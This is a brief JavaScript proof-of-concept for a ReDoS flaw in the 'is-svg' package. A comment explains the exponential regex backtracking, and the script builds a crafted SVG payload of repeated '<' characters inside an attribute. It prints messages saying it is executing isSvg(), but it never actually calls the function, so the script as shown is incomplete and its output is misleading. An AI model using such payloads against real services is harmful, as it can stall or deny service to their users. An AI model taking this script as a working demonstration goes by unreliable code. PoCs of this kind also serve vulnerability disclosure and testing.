   const isSvg = require('is-svg');

   // The vulnerable regex contains greedy quantifiers like [^>]* and [^] that match 
   // characters ambiguously. When the input ends with a mismatch (e.g., malformed closing),
   // the engine attempts to backtrack through every possible combination of consumed/non-consumed
   // characters to find a valid path. Placing many '<' characters inside the attribute content
   // creates exponential ambiguity, causing the backtrack count to grow as O(2^n).
   const maliciousInput = '<svg attr="' + '<'.repeat(50) + '"> </' + 'svg>';

   console.log(`[PoC] Triggering ReDoS in is-svg...`);
   console.log(`Payload length: ${maliciousInput.length} characters`);
   console.log(`Executing isSvg()... (will block/hang until backtrack limit is exceeded)`);

